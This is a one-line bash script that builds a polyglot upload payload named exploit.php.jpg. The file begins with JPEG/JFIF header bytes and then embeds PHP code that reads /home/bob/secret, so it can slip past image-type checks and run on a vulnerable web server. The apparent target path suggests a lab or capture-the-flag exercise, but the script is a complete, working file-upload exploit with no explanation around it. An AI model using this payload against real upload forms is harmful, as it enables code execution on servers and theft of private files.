#!/bin/bash

printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php echo file_get_contents("/home/bob/secret"); ?>' > exploit.php.jpg
